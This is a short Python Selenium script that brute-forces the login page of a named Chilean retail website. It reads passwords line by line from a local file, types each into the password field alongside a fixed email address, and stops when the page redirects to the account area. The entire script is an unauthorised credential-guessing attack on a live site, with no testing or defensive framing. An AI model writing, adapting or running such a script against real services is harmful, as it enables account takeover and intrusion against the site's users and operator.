from selenium import webdriver
import time

archivo = open(r'C:\Users\gndon\Desktop\chromedriver_win32\passwords2.txt')
mail = "catew75673@eoscast.com"
contrasena = []

while True:
    
    agregado = archivo.readline()
    contrasena.append(agregado)
    
    if  agregado == "":
        break
    
driver = webdriver.Chrome(r'C:\Users\gndon\Desktop\chromedriver_win32\chromedriver.exe')
driver.get("https://familyshop.cl/on/demandware.store/Sites-FamilyShop-Site/es_CL/Login-Show")

pathB = driver.find_element_by_xpath('//*[@id="login-form-email"]')
pathB.send_keys(mail)

for x in contrasena:

    driver.find_element_by_xpath('//*[@id="login-form-password"]').clear()
    pathB = driver.find_element_by_xpath('//*[@id="login-form-password"]')
    pathB.send_keys(x)
    
    time.sleep(0.1)
    
    if driver.current_url == 'https://familyshop.cl/account?registration=false':
        break

archivo.close()